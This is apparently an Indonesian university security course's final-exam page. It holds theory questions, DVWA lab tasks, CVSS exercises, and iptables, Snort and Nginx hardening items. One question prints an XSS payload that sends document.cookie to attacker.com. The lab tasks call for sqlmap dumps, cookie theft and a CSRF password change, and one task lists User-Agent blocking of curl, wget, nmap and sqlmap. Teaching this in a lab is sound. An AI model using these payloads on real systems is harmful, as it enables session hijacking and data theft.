# 🏆 Pertemuan 16: UAS (Ujian Akhir Semester)

## Informasi Ujian

| Keterangan | Detail |
| :--------- | :----- |
| **Jenis** | UAS (Ujian Akhir Semester) |
| **Cakupan Materi** | Pertemuan 9 – 15 (+ komprehensif Pertemuan 1–7) |
| **Format** | Teori + Praktik + Laporan |
| **Durasi** | 120 menit |

---

## 🎯 Cakupan Materi UAS

### Pertemuan 9: SQL Injection
- Jenis SQLi: In-band, Blind, Out-of-band
- Manual Union-Based injection dan analisis kolom
- Automated scanning dengan `sqlmap` (scan, dump, banner)
- Prepared statements dan parameterized queries sebagai mitigasi

### Pertemuan 10: XSS & CSRF
- Stored, Reflected, DOM-based XSS
- Teknik pencurian cookie via XSS
- CSRF dengan auto-submit form
- CSP, HttpOnly, SameSite, Anti-CSRF Token

### Pertemuan 11: CVE & CVSS
- Format dan lifecycle CVE ID
- CVSS v4.0 metric groups: Base, Threat, Environmental
- NVD sebagai integrator CVE + CVSS
- Menghitung dan menginterpretasikan skor severity
- Studi kasus Log4Shell, EternalBlue

### Pertemuan 12: Setup VPS & Nginx
- Provisioning VPS dan install EasyPanel
- Konfigurasi Nginx sebagai reverse proxy dan WAF dasar
- Rate limiting, User-Agent blocking, SQL Injection filtering di Nginx
- SSL dengan Certbot, monitoring dengan Fail2ban

### Pertemuan 13: Hands-On Reverse Proxy
- Arsitektur NginxProxy vs HalimunProxy
- Perbedaan enkripsi end-to-end vs WAF rules biasa
- Replay protection, SSRF guard, camouflage routing
- Analisis header information leakage

### Pertemuan 14: Firewalling dengan iptables
- Netfilter tables dan chains (INPUT, OUTPUT, FORWARD)
- DROP vs REJECT vs ACCEPT
- Rate limiting dan port scanning detection
- Persistence dengan iptables-persistent

### Pertemuan 15: IDS dengan Snort
- Arsitektur Snort (Decoder, Preprocessor, Detection Engine)
- Mode operasi: Sniffer, Logger, IDS
- Sintaks rules Snort dan custom rules
- Deteksi Nmap scan dan SSH brute force

---

## 📋 Contoh Soal Teori

### Bagian A: Web Application Security

**1.** Jelaskan perbedaan antara SQL Injection In-Band dan Blind SQL Injection. Berikan contoh payload untuk masing-masing tipe!

**2.** Sebuah aplikasi memiliki kolom komentar yang langsung merender HTML tanpa sanitasi. Seorang penyerang memasukkan payload berikut:
```html
<img src="x" onerror="fetch('http://attacker.com/?c='+document.cookie)">
```
a) Jenis XSS apa ini?
b) Apa yang akan terjadi saat user lain membuka halaman tersebut?
c) Bagaimana cara mencegahnya?

**3.** Jelaskan mengapa CSRF berhasil meskipun tidak ada XSS. Apa kondisi yang harus terpenuhi agar CSRF bisa dieksploitasi?

### Bagian B: CVE & CVSS

**4.** Sebuah kerentanan ditemukan pada web server dengan karakteristik:
- Dapat dieksploitasi dari internet
- Tidak membutuhkan autentikasi
- Tidak membutuhkan interaksi user
- Dampak: Attacker bisa baca semua file di server (Confidentiality: High), tidak bisa modifikasi (Integrity: None), server tetap jalan (Availability: None)

Hitung perkiraan CVSS Base Score dan tentukan kategori severity-nya!

**5.** Apa perbedaan fungsi antara `cve.org`, `nvd.nist.gov`, dan `first.org/cvss`? Kapan kita menggunakan masing-masing situs tersebut?

### Bagian C: Defense — Proxy, Firewall, IDS

**6.** Jelaskan mengapa `sqlmap` berhasil menyerang backend langsung tetapi gagal total melawan HalimunProxy, meskipun keduanya menjalankan backend PHP yang sama!

**7.** Anda memiliki rule iptables berikut:
```bash
iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
```
a) Apa fungsi rule ini?
b) Apa kelemahan konfigurasi ini dibanding Fail2ban?

**8.** Tulis sebuah rule Snort untuk mendeteksi percobaan SQL Injection melalui HTTP yang mengandung kata kunci `UNION` atau `SELECT` pada port 80. Jelaskan setiap bagian rule tersebut!

---

## 🛠️ Soal Praktik UAS

### Soal Praktik 1: Full Attack Chain pada DVWA

Setup lab dengan DVWA menggunakan Docker Compose. Lakukan:

1. **SQL Injection**: Gunakan `sqlmap` untuk mendump tabel `users` dari database DVWA. Screenshot setiap langkah.
2. **Stored XSS**: Masukkan payload XSS yang mencuri session cookie ke kolom komentar DVWA. Tunjukkan cookie yang berhasil dicuri di terminal listener Kali.
3. **CSRF**: Buat halaman HTML exploit yang mengubah password admin DVWA. Tunjukkan bahwa password berhasil berubah.

### Soal Praktik 2: Hands-On Proxy Comparison

Jalankan **NginxProxy** lab dari `HandsOnServerProxy/NginxProxy`:

1. Dokumentasikan hasil serangan ke **Direct Backend (port 5000)** vs **via Nginx Proxy (port 8080)** untuk:
   - Akses file `/config`
   - SQL Injection via `sqlmap`
   - Header information (Server, X-Powered-By)
2. Buat tabel perbandingan berdasarkan hasil yang didapat.
3. Monitor dan screenshot log Nginx saat serangan berlangsung.

### Soal Praktik 3: CVE Research & CVSS Scoring

1. Cari 2 CVE dari tahun 2023–2024 dengan skor Critical (≥9.0) dari `nvd.nist.gov`
2. Untuk masing-masing CVE, buat analisis:
   - Software apa yang terdampak?
   - Bagaimana vektor serangannya (jelaskan setiap metrik CVSS)?
   - Apakah sudah ada patch? Apa rekomendasinya?
3. Gunakan CVSS Calculator di `first.org/cvss/calculator/4.0` untuk memverifikasi skor

### Soal Praktik 4: Nginx Hardening (Opsional — Nilai Tambah)

Di VPS yang sudah dibuat (Pertemuan 12) atau VM lokal:

1. Konfigurasi Nginx dengan semua fitur keamanan:
   - Rate limiting (login: 5/menit, API: 10/detik)
   - User-Agent blocking (curl, wget, nmap, sqlmap)
   - SQL Injection filter di query string
   - Security headers (X-Frame-Options, X-XSS-Protection, X-Content-Type-Options)
2. Jalankan Nikto terhadap Nginx yang sudah dikonfigurasi
3. Hitung persentase serangan Nikto yang berhasil diblokir

---

## 📊 Format Laporan UAS

Laporan dibuat dalam format PDF dengan struktur:

```
1. Cover (Nama, NIM, Kelas)
2. Pendahuluan (Tujuan praktikum)
3. Metodologi (Tools dan environment)
4. Hasil per Soal Praktik
   - Screenshot setiap langkah
   - Analisis hasil
5. Kesimpulan dan Rekomendasi
6. Referensi
```

---

## 📚 Referensi untuk Persiapan UAS

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [NVD — National Vulnerability Database](https://nvd.nist.gov/)
- [CVSS v4.0 Calculator](https://www.first.org/cvss/calculator/4.0)
- [Snort Rules Documentation](https://docs.snort.org/)
- [iptables Manual](https://linux.die.net/man/8/iptables)
- [Nginx Security Headers](https://nginx.org/en/docs/http/ngx_http_headers_module.html)

---

## 🔗 Referensi Cepat: Docker Compose untuk Lab UAS

```yaml
version: '3.8'

services:
  kali-attacker:
    image: kalilinux/kali-rolling
    container_name: kali-attacker
    tty: true
    stdin_open: true
    privileged: true
    volumes:
      - ./kali-home:/root
    networks:
      lab_network:
        ipv4_address: 172.20.0.5

  dvwa-target:
    image: vulnerables/web-dvwa
    container_name: target-web
    ports:
      - "8080:80"
    networks:
      lab_network:
        ipv4_address: 172.20.0.10

networks:
  lab_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

```bash
# Jalankan lab
docker-compose up -d

# Masuk ke Kali
docker exec -it kali-attacker bash

# Install tools
apt update && apt install -y nmap sqlmap nikto curl python3
```
